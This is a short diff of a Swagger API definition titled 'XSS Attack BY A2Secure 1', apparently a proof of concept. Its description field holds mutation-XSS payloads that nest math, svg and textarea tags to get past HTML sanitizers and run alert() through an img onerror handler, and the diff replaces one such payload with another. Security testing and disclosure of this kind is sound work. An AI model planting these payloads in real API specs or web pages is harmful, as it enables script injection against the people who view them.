@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY A2Secure 1
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>"><script>alert(1)</script></form>
+     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
   version: production
 basePath: /JSSResource/
 produces:
